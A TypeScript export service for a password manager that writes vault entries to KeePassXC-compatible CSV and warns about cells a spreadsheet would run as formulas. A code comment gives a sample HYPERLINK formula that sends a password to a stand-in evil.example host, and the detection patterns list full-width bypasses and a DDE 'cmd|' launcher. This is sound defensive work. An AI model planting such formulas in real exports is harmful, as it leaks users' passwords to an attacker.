import * as kdbxweb from 'kdbxweb';
import { TotpService } from './TotpService';
import { CustomField } from '../types/database';

const STANDARD_FIELDS = ['Title', 'UserName', 'Password', 'URL', 'Notes'];

export class ExportService {
    // KeePassXC-compatible CSV: same columns, everything quoted, ISO dates
    static readonly CSV_HEADERS = ['Group', 'Title', 'Username', 'Password', 'URL', 'Notes', 'TOTP', 'Icon', 'Last Modified', 'Created'];

    private static quote(value: string): string {
        return '"' + value.replace(/"/g, '""') + '"';
    }

    private static fieldString(value: string | kdbxweb.ProtectedValue | undefined): string {
        if (value === undefined) return '';
        return value instanceof kdbxweb.ProtectedValue ? value.getText() : String(value);
    }

    private static totpUriOf(entry: kdbxweb.KdbxEntry): string {
        const customFields: CustomField[] = [];
        for (const [key, value] of entry.fields) {
            if (STANDARD_FIELDS.includes(key)) continue;
            customFields.push({ key, value, protected: value instanceof kdbxweb.ProtectedValue });
        }
        const config = TotpService.getConfig(customFields);
        if (!config) return '';
        return TotpService.buildOtpAuthUri(config, this.fieldString(entry.fields.get('Title')) || 'Entry');
    }

    static collectRows(kdbxDb: kdbxweb.Kdbx): string[][] {
        const recycleBinUuid = kdbxDb.meta.recycleBinEnabled ? kdbxDb.meta.recycleBinUuid?.id : undefined;
        const rows: string[][] = [];

        const walk = (group: kdbxweb.KdbxGroup, path: string) => {
            if (recycleBinUuid && group.uuid.id === recycleBinUuid) return;
            for (const entry of group.entries) {
                rows.push([
                    path,
                    this.fieldString(entry.fields.get('Title')),
                    this.fieldString(entry.fields.get('UserName')),
                    this.fieldString(entry.fields.get('Password')),
                    this.fieldString(entry.fields.get('URL')),
                    this.fieldString(entry.fields.get('Notes')),
                    this.totpUriOf(entry),
                    String(entry.icon ?? 0),
                    entry.times.lastModTime?.toISOString() ?? '',
                    entry.times.creationTime?.toISOString() ?? '',
                ]);
            }
            for (const child of group.groups) {
                walk(child, `${path}/${child.name ?? ''}`);
            }
        };

        const root = kdbxDb.getDefaultGroup();
        walk(root, String(root.name ?? 'Root'));
        return rows;
    }

    static entryCount(kdbxDb: kdbxweb.Kdbx): number {
        return this.collectRows(kdbxDb).length;
    }

    // Rows can be passed in by a caller that already collected them, so an
    // export that also inspects its own contents walks the vault once
    static toCsv(kdbxDb: kdbxweb.Kdbx, rows: string[][] = this.collectRows(kdbxDb)): string {
        const lines = [this.CSV_HEADERS, ...rows]
            .map(row => row.map(field => this.quote(field)).join(','));
        return lines.join('\r\n') + '\r\n';
    }

    // ---- spreadsheet formula detection ----
    //
    // Excel, LibreOffice and Google Sheets read a cell opening with =, +, -
    // or @ as a formula rather than as text, and quote() above does nothing
    // about that: those quotes belong to the CSV parser and are gone by the
    // time the value reaches a cell. It matters here because this file puts
    // every password in a column of its own, so a formula sitting in the same
    // row can read one and send it somewhere:
    //
    //   =HYPERLINK("https://evil.example/?d="&D2,"Account details")
    //
    // Prefixing the value to defuse it is the usual advice and is wrong for
    // this file: the ' would become part of the data and come back with it on
    // the next import, and a KeePassXC-compatible CSV exists to be imported.
    // So the bytes are left exactly as they were and the user is told instead.

    // A leading trigger on its own is not worth saying anything about. A
    // password of "-hunter2", a phone number in a note, a heading written
    // "=== keys ===" are all text that happens to start with one, and warning
    // on those only teaches people to click through the warning that matters.
    // What turns a trigger into something that can act is a call, so both have
    // to be present before this reports anything.
    //
    // Measured rather than assumed: these were exported through toCsv and the
    // cells read back out of Excel for Mac (September 2026). What parsed there
    // was =, +, - and @ in the first position and nothing else. Excel rewrites
    // them on the way in, so "+HYPERLINK(..)" lands as "=+HYPERLINK(..)" and
    // "@SUM(1,2)" as "=SUM(1,2)", both live.
    //
    // What did NOT parse in that build: a leading space or tab, and every
    // full-width form. Both are kept below anyway, for reasons that outlive
    // one measurement. OWASP recommends the tab prefix as a mitigation and
    // warns in the same breath that it comes undone across an Excel save and
    // reopen, which puts the formula back. The full-width forms (U+FF1D ＝,
    // U+FF0B ＋, U+FF0D －, U+FF20 ＠) are documented as a bypass whose
    // handling depends on locale, and this was one locale. Keeping both costs
    // nothing real: no genuine vault field starts with a full-width equals or
    // a space and then goes on to call a function, so neither branch fires on
    // data anyone actually stores
    private static readonly FORMULA_TRIGGER = /^\s*[=+\-@＝＋－＠]/;
    // Deliberately allows no space before the bracket. Real payloads are
    // written FUNC(, while "=Total (see below)" is prose that would otherwise
    // be reported every time. U+FF08 is the full-width bracket, for the same
    // reason the triggers above carry their full-width forms
    private static readonly FUNCTION_CALL = /[A-Za-z_][A-Za-z0-9_.]*[(（]/;
    // Old Excel's process launcher, which reaches out through a pipe rather
    // than through a call and so matches neither of the above
    private static readonly DDE_CALL = /\bcmd\s*\|/i;

    static looksLikeFormula(value: string): boolean {
        if (!this.FORMULA_TRIGGER.test(value)) return false;
        return this.FUNCTION_CALL.test(value) || this.DDE_CALL.test(value);
    }

    // Which exported cells a spreadsheet would run, named by the entry they
    // belong to so the export dialog can point at them. Takes rows rather
    // than the database so it inspects exactly what toCsv is about to write
    static formulaRisks(rows: string[][]): Array<{ title: string; column: string }> {
        const risks: Array<{ title: string; column: string }> = [];
        for (const row of rows) {
            row.forEach((value, index) => {
                if (this.looksLikeFormula(value)) {
                    risks.push({ title: row[1] || '(untitled)', column: this.CSV_HEADERS[index] });
                }
            });
        }
        return risks;
    }

    static exportFileName(kdbxDb: kdbxweb.Kdbx): string {
        const name = (kdbxDb.meta.name || 'vigil').replace(/[^\w.-]+/g, '_');
        return `${name}-export.csv`;
    }
}
